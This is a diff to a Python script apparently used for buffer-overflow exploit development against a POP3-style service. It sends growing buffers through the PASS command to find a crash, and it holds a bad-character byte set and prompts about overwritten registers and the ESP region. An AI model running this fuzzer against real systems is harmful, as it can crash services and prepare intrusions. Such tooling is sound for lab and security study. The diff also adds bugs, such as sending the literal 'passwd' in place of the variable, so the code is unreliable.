@@ -12,6 +12,8 @@ _delimiter = f'**************************************'      # User adjustable ve
 _current_step = 0                                           # Incremental counter for tracking all steps
 _known_bad_chars = []                                       # Universal storage of chars deemed problematic
 payload = ''                                                # Tracking changes to payload throughout process
+exit_option = f'[\'q\' to quit]'
+post_direction = f'Please try again.'
 bad_chars = (                                               # Bad character set used for testing. (Static)
     "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
     "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -62,10 +64,13 @@ def send_var(_var, _ip, _port):
         s.settimeout(10.0)                                          # Timeout in seconds (S)
         s.connect((_ip, _port))
         s.recv(1024)
-        s.send(b'USER test\r\n')                                    # <REFACTOR> for different syntax/proto than pop3
+        s.send(b'USER test\r\n')                                    # <REFACTOR> for different syntax/proto
         s.recv(1024)
-        s.send(b'PASS {_var}\r\n')                                  # <REFACTOR> for different syntax/proto than pop3
-        s.send(b'QUIT\r\n')                                         # <REFACTOR> for different syntax/proto than pop3
+        passwd = f'PASS {_var}\r\n'
+        s.send(b'passwd')                                  # <REFACTOR> for different syntax/proto
+        s.recv(1024)
+        print(type(passwd), len(passwd), 'password shit')
+        #s.send(b'QUIT\r\n')                                         # <REFACTOR> for different syntax/proto
         s.close()
         result = 'pass'
     except socket.timeout:
@@ -150,34 +155,47 @@ def execute_command(_sys_command):
 
 
 def interactive_sanitize(_obj, _msg, _type):
+    global exit_option
+    global post_direction
     global _delimiter
-    exit_option = f'[\'q\' to quit]'
-    post_direction = f'Please try again.'
-    while _obj != 'q' or _obj != 'Q':
-        if _type == str or type == int:
-            while not(isinstance(_obj, _type)) and _obj.lower() != 'q':
+    while _obj != 'q' and _obj != 'Q':
+        if _type == int:
+            while type(_obj) != int:
                 try:
-                    if _type == 'str':
-                        _obj = f'{_obj.lower()}'
-                    elif _type == 'int':
-                        _obj = int(_obj)
-                except TypeError as error_message:
-                    print(f'{_delimiter}\n[+] ERROR:\n[+]{error_message}\n{post_direction}\n{_delimiter}\n')
+                    return int(_obj)
+                except Exception as error_message:
+                    print(f'{_delimiter}\n[+] Error:\n{error_message}\n{_delimiter}\n[+]{post_direction}\n')
                     _obj = input(f'{_msg} {exit_option}\n')
+                    if _obj == 'q' or _obj == 'Q':
+                        exit(0)
+        elif _type == str:
+            while type(_obj) != str:
+                try:
+                    return f'{_obj}'
+                except Exception as error_message:
+                    print(f'{_delimiter}\n[+] Error:\n{error_message}\n{_delimiter}\n[+]{post_direction}\n')
+                    _obj = input(f'{_msg} {exit_option}\n')
+                    if _obj == 'q' or _obj == 'Q':
+                        exit(0)
         elif _type == 'alnum':
             while not(_obj.isalnum()):
                 error_message = 'String input must be alphanumeric!. '
                 print(f'{_delimiter}\n[+] ERROR:\n[+]{error_message}\n{post_direction}\n{_delimiter}\n')
                 _obj = input(f'{_msg} {exit_option}\n').lower()
+                if _obj == 'q' or _obj == 'Q':
+                    exit(0)
+            return _obj
         elif _type == 'hex':
             hex_passed = 0
             while hex_passed != 1:
                 try:
                     int(_obj, 16)
                     hex_passed = 1
+                    return _obj
                 except Exception as error_message:
-                    _obj = input(f'{_delimiter}\n{error_message}\n{_delimiter}\n{exit_option}\n{post_direction}\n\n')
-    return _obj
+                    _obj = input(f'{_delimiter}\n{error_message}\n{_delimiter}\n{exit_option}\n{post_direction}\n')
+                    if _obj == 'q' or _obj == 'Q':
+                        exit(0)
 
 
 def test_ascii_at_offset(_offset):
@@ -218,16 +236,19 @@ def esp_region_msg():
 
 
 def fuzz_test(_ip, _port, _char_length):
+    global exit_option
+    global post_direction
     global _delimiter
-    buffers = ["A"]
+    buffers = []
     ascii_len = 100
-    buffer_max_len = _char_length/100
+    print(_char_length, type(_char_length))
+    buffer_max_len = _char_length/ascii_len
     while len(buffers) <= buffer_max_len:
         buffers.append("A" * ascii_len)
         ascii_len = ascii_len + 100
     current_buffer = ''
-
     start_time = time.time()
+
     for buffer in buffers:
         current_buffer = buffer
         msg = f'[+] {_ip}:{_port} <== {len(buffer)} bytes. Take note the byte length if there is unusual delay.\n'
@@ -236,14 +257,21 @@ def fuzz_test(_ip, _port, _char_length):
         time.sleep(1)
         elapsed_time = get_elapsed_time(start_time, 'quiet')
         if tcp_result == 'fail' or elapsed_time/len(buffers) > 5.0:
+            print('[x] The target failed to respond in enough time. Exiting.\n')
             break
     msg = f'[+] Potential failure at byte length: {len(current_buffer)} bytes. Investigate target registers noting ' \
-          f'any potentially overwritten.\n\tDid you have an overflow and subsequent exploitable register? (Y/N)'
-    response = input(msg).lower()
-    while response != 'y' and response != 'n':
-        msg = 'Please only enter a \'Y\' for yes or a \'N\' for no. [Type \'exit\' or \'q\' to exit.]\n'
+          f'any potentially overwritten.\n\tDid you identify an overflow and exploitable register? (Y/N) {exit_option}'
+    try:
         response = input(msg).lower()
-        if response == 'exit' or response == 'q':
+    except:
+        response = input(msg)
+    if response == 'n' or response == 'q':
+        print('[BYE] -- TIP: Try to restart the script with a longer char_length.\n-c, --char_length ++\n')
+        exit(0)
+    while response != 'y' and response != 'n':
+        msg = f'Please only enter a \'Y\' for yes or a \'N\' for no. {exit_option}\n'
+        response = input(msg).lower()
+        if response == 'q':
             print('[BYE] -- TIP: Try to restart the script with a longer char_length.\n-c, --char_length ++\n')
             exit(0)
     msg = f'[CONTINUING] {_delimiter}'
@@ -305,6 +333,7 @@ def main():
     char_length = args.char_length                                              # Defaults to 6000
     msg = f'The char_length value provided ({char_length}) is not an int. Enter another value for this variable.\n'
     char_length = interactive_sanitize(char_length, msg, int)
+    print(type(char_length))
 
     # ****************************************************************************************
     # Loop through a buffer adding 100 char length to said buffer looking for a crash.
